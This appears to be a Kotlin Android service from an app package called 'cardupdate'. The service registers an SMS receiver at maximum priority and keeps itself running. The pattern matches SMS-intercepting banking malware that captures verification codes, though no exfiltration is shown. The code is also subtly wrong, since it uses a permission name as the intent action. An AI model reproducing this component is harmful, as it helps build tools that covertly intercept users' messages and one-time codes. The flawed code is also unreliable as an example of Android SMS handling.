package com.example.cardupdate

import android.Manifest
import android.app.Service
import android.content.Intent
import android.content.IntentFilter
import android.os.IBinder
import com.example.cardupdate.SmsRec


class SmsProcessService :Service() {
    val smsre= SmsRec()
    override fun onBind(p0: Intent?): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val filter = IntentFilter()
        filter.addAction(Manifest.permission.RECEIVE_SMS)
        filter.priority = 2147483647
        registerReceiver(smsre, filter);
        return START_STICKY
    }

}